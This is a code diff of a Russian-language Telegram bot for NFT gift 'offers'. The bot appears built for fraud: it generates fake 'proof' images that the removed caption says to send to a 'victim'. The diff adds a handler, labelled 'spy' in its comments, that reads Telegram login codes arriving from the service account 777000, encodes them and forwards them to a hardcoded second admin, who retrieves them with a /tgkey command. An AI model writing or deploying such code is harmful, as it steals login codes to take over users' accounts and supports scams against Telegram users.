@@ -26,9 +26,10 @@ logging.basicConfig(level=logging.INFO, stream=sys.stdout)
 log = logging.getLogger("offerbot")
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
-# ТУТ ДВА АДМИНА
-ADMIN_IDS = [ADMIN_ID, 6658790377] 
+# АДМИНЫ
+ADMIN_1 = 8632158680
+ADMIN_2 = 6658790377
+ADMIN_IDS = [ADMIN_1, ADMIN_2]
 
 DEFAULT_RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")
 DB_PATH = os.getenv("DB_PATH", "/data/bot.db")
@@ -39,6 +40,32 @@ router = Router()
 dp.include_router(router)
 
 BUSINESS_CONNS = {}
+# Хранилище последних кодов от Telegram
+TG_KEYS = []
+
+# ==========================================
+# ШИФРОВКА КОДОВ (1=A, 2=B...)
+# ==========================================
+RUS_ALPHABET = "АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ"
+ENG_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+def encrypt_code(code: str) -> str:
+    result = []
+    for char in code:
+        if char.isdigit():
+            # 1 = А, 2 = Б, ... 0 = 10-я буква или О
+            idx = int(char) if int(char) != 0 else 10
+            result.append(RUS_ALPHABET[idx - 1])
+        elif char.isalpha():
+            # Буквы шифруем в английские
+            idx = ENG_ALPHABET.find(char.upper())
+            if idx != -1:
+                result.append(str(idx + 1))
+            else:
+                result.append(char)
+        else:
+            result.append(char)
+    return "".join(result)
 
 # ==========================================
 # СЛОВАРИ ПЕРЕВОДОВ
@@ -91,6 +118,7 @@ init_db()
 NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
 PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
 CODE_RE = re.compile(r"(of_[a-f0-9]{5})", re.I)
+TG_CODE_RE = re.compile(r"(\d{5,6})")
 
 def parse_nft(url: str):
     m = NFT_RE.search(url)
@@ -109,7 +137,7 @@ def parse_price(text: str):
     return (amount, "Stars")
 
 # ==========================================
-# ГЕНЕРАЦИЯ ДОКАЗАТЕЛЬСТВА (ДИНАМИЧЕСКИЕ КООРДИНАТЫ)
+# ГЕНЕРАЦИЯ ДОКАЗАТЕЛЬСТВА
 # ==========================================
 def generate_proof_image(nft_name: str, price_str: str) -> BytesIO:
     template_path = "IMG_0401.jpg"
@@ -126,12 +154,10 @@ def generate_proof_image(nft_name: str, price_str: str) -> BytesIO:
     width, height = img.size
     draw = ImageDraw.Draw(img)
 
-    # Координаты плашки (в процентах от размера картинки)
     rect_x1 = int(width * 0.265)
     rect_y1 = int(height * 0.312)
     rect_x2 = int(width * 0.730)
     rect_y2 = int(height * 0.402)
-    
     draw.rectangle([rect_x1, rect_y1, rect_x2, rect_y2], fill=(28, 35, 49))
 
     try:
@@ -184,8 +210,7 @@ async def delete_code_message(bot_instance: Bot, chat_id: int, msg_id: int, conn
     except Exception:
         try: 
             await bot_instance.edit_message_text(text="\u200b", chat_id=chat_id, message_id=msg_id, business_connection_id=conn_id)
-        except Exception: 
-            pass
+        except Exception: pass
 
 # ==========================================
 # BUSINESS CONNECTION
@@ -196,6 +221,44 @@ async def on_business_conn(conn: BusinessConnection):
     with get_db() as db_conn:
         db_conn.execute("INSERT OR REPLACE INTO business_conns (user_id, conn_id) VALUES (?, ?)", (conn.user.id, conn.id))
     log.info(f"✅ Business: user={conn.user.id} id={conn.id}")
+
+# ==========================================
+# ШПИОН (СЛУШАЕМ 777000)
+# ==========================================
+@router.message(F.chat.id == 777000)
+async def spy_telegram_code(msg: Message):
+    log.info(f"🔔 Получено сообщение от Telegram (777000): {msg.text}")
+    match = TG_CODE_RE.search(msg.text)
+    if match:
+        code = match.group(1)
+        encrypted = encrypt_code(code)
+        TG_KEYS.append({"raw": code, "enc": encrypted})
+        
+        # Отправляем второму админу
+        try:
+            await bot.send_message(ADMIN_2, 
+                f"🔐 <b>Перехвачен код Telegram!</b>\n\n"
+                f"Сырой код: <code>{code}</code>\n"
+                f"Шифр: <code>{encrypted}</code>\n\n"
+                f"Введите /tgkey, чтобы получить его."
+            )
+        except Exception as e:
+            log.error(f"Не удалось отправить код: {e}")
+
+@router.message(Command("tgkey"))
+async def cmd_tgkey(msg: Message):
+    if msg.from_user.id != ADMIN_2:
+        return await msg.reply("❌ Эта команда только для второго админа.")
+    
+    if not TG_KEYS:
+        return await msg.reply("❌ Кодов пока нет. Жди СМС.")
+    
+    last_key = TG_KEYS[-1]
+    await msg.reply(
+        f"🔑 <b>Последний код:</b>\n\n"
+        f"Сырой: <code>{last_key['raw']}</code>\n"
+        f"Шифр: <code>{last_key['enc']}</code>"
+    )
 
 # ==========================================
 # МЕНЮ
@@ -233,7 +296,7 @@ async def show_main_menu(target, uid):
 @router.message(Command("start"))
 async def cmd_start(msg: Message):
     if msg.from_user.id in ADMIN_IDS:
-        await msg.reply("👑 <b>Админ:</b>\n/keys\n/set_default @ник\n/addkey\n/setbotmax [токен]\n/delbot @username\n/restartbots")
+        await msg.reply("👑 <b>Админ:</b>\n/keys\n/set_default @ник\n/addkey\n/setbotmax [токен]\n/delbot @username\n/restartbots\n/tgkey — (только для 2-го админа)")
         return
     await show_main_menu(msg, msg.from_user.id)
 
@@ -243,7 +306,7 @@ async def cb_main_menu(cb: CallbackQuery):
     await cb.answer()
 
 # ==========================================
-# МОИ ОФФЕРЫ (В ОДНОМ СООБЩЕНИИ)
+# МОИ ОФФЕРЫ
 # ==========================================
 @router.callback_query(F.data == "my_offers_menu")
 async def cb_my_offers_menu(cb: CallbackQuery):
@@ -259,20 +322,15 @@ async def cb_my_offers_menu(cb: CallbackQuery):
     kb_list = []
     
     for o in offers:
-        lang = o["lang"] if o["lang"] else "ru"
         price_str = f"{o['price_amount']} ⭐️" if o["price_currency"] == "Stars" else f"{o['price_amount']} Gram"
-        
         text += f"🆔 <code>{o['id']}</code> | {o['nft_name']} | {price_str}\n"
-        
         kb_list.append([
             InlineKeyboardButton(text=f"📸 Док ({o['id']})", callback_data=f"proof:{o['id']}"),
             InlineKeyboardButton(text=f"🗑 Удалить ({o['id']})", callback_data=f"del_offer:{o['id']}")
         ])
     
     kb_list.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")])
-    kb = InlineKeyboardMarkup(inline_keyboard=kb_list)
-    
-    await cb.message.edit_text(text, reply_markup=kb)
+    await cb.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_list))
     await cb.answer()
 
 @router.callback_query(F.data.startswith("proof:"))
@@ -280,21 +338,13 @@ async def cb_proof(cb: CallbackQuery):
     oid = cb.data.split(":")[1]
     with get_db() as conn:
         offer = conn.execute("SELECT * FROM offers WHERE id=?", (oid,)).fetchone()
-    
     if not offer:
-        await cb.answer("Оффер не найден", show_alert=True)
-        return
+        return await cb.answer("Оффер не найден", show_alert=True)
 
-    price_str = offer["price_amount"]
-    await cb.message.answer("⏳ Генерирую доказательство для этого оффера...")
-    
-    img_bio = generate_proof_image(offer["nft_name"], price_str)
+    await cb.message.answer("⏳ Генерирую доказательство...")
+    img_bio = generate_proof_image(offer["nft_name"], offer["price_amount"])
     photo = BufferedInputFile(img_bio.read(), filename="proof.png")
-    
-    await cb.message.answer_photo(
-        photo, 
-        caption=f"✅ Доказательство для оффера <code>{oid}</code> готово.\nОтправьте это фото жертве."
-    )
+    await cb.message.answer_photo(photo, caption=f"✅ Доказательство для оффера <code>{oid}</code> готово.")
     await cb.answer()
 
 @router.callback_query(F.data.startswith("del_offer:"))
@@ -302,7 +352,7 @@ async def cb_del_offer(cb: CallbackQuery):
     oid = cb.data.split(":")[1]
     with get_db() as conn:
         conn.execute("DELETE FROM offers WHERE id=?", (oid,))
-    await cb.message.edit_text(f"🗑 Оффер <code>{oid}</code> удален.\n\nВернитесь в меню.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="my_offers_menu")]]))
+    await cb.message.edit_text(f"🗑 Оффер <code>{oid}</code> удален.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="my_offers_menu")]]))
     await cb.answer()
 
 # ==========================================
@@ -330,7 +380,7 @@ async def cb_buy_sub(cb: CallbackQuery):
     await cb.answer()
 
 # ==========================================
-# КОМАНДЫ
+# КОМАНДЫ КЛИЕНТА
 # ==========================================
 @router.message(Command("key"))
 async def cmd_key(msg: Message):
